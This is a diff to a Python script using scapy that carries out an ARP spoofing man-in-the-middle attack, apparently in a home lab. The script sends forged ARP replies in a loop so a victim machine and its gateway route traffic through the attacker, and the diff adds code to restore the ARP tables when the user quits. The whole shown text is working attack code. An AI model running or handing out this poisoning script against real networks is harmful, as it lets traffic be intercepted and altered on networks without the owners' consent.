@@ -34,14 +34,25 @@ def spoof(target_ip, spoof_ip,):
     scapy.send(packet, verbose=False)  # command change the default gateway IP to attacker MAC addr
 
 
-keep_looping = True
+def restore(dst_ip, src_ip):
+    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=get_mac(dst_ip), psrc=src_ip, hwsrc=get_mac(src_ip))
+    scapy.send(packet, verbose=False)
+
+
 i = 0
-while keep_looping:
-    spoof("192.168.159.133", "192.168.159.2")
-    spoof("192.168.159.2", "192.168.159.133")
-    i += 2
-    print(f"\rsending the {i} packets", end="")
-    sys.stdout.flush()
-    time.sleep(2)
+keep_looping = True
+try:
+    while keep_looping:
+        spoof("192.168.159.133", "192.168.159.2")
+        spoof("192.168.159.2", "192.168.159.133")
+        i += 2
+        print(f"\rsending the {i} packets", end="")
+        sys.stdout.flush()
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("\n[+] Detected CTRL + C ... Quitting.\n"
+          "reset the ARP table...")
+    restore("192.168.159.133", "192.168.159.2")
+    restore( "192.168.159.2", "192.168.159.133")
 
 
